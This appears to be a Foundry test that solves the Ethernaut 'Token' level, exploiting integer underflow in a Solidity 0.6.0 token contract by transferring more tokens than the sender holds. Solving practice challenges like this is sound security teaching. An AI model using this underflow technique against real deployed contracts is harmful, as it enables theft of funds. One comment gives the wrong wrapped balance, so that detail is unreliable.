// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {console} from "forge-std/console.sol";
import {Token} from "../../src/ethernaut/05.sol";

// Minimal test framework for Solidity 0.6.0 compatibility
interface Vm {
    function addr(uint256 privateKey) external returns (address);

    function deal(address who, uint256 newBalance) external;

    function startPrank(address caller) external;

    function stopPrank() external;
}

contract ForgeTestLite {
    address internal constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));
    Vm internal constant vm = Vm(HEVM_ADDRESS);

    function assertEq(address a, address b) internal pure {
        require(a == b, "assertEq(address,address) failed");
    }

    function assertEq(uint256 a, uint256 b) internal pure {
        require(a == b, "assertEq(uint256,uint256) failed");
    }
}

contract TokenTest is ForgeTestLite {
    Token public tokenContract;
    address public attacker = vm.addr(1);

    function setUp() public {
        tokenContract = new Token(20); // Start with only 20 tokens
        vm.deal(attacker, 1 ether);
    }

    function testHack() public {
        uint256 initialBalance = tokenContract.balanceOf(address(this));
        console.log("Initial balance: ", initialBalance);
        assertEq(initialBalance, 20);

        address victim = address(0xBEEF);
        uint256 initialVictimBalance = tokenContract.balanceOf(victim);
        console.log("Initial victim balance: ", initialVictimBalance);
        assertEq(initialVictimBalance, 0);

        // The vulnerability: integer underflow in Solidity 0.6.0
        // If we transfer more than our balance, the subtraction underflows
        // require(balances[msg.sender] - _value >= 0) will pass because
        // underflow gives a very large positive number
        uint256 transferAmount = initialBalance + 1; // Transfer more than we have
        console.log("Transferring: ", transferAmount);

        // This should trigger underflow and give victim a huge balance
        tokenContract.transfer(victim, transferAmount);

        uint256 finalVictimBalance = tokenContract.balanceOf(victim);
        console.log("Final victim balance: ", finalVictimBalance);

        // The victim should have received the transfer amount due to underflow
        // In reality, balances[msg.sender] underflowed to a huge number,
        // and balances[victim] got += transferAmount
        assertEq(finalVictimBalance, transferAmount);

        // Our balance should have underflowed to a huge number
        uint256 finalBalance = tokenContract.balanceOf(address(this));
        console.log("Our final balance (underflowed): ", finalBalance);
        // This will be a huge number due to underflow: 2^256 - transferAmount
    }
}
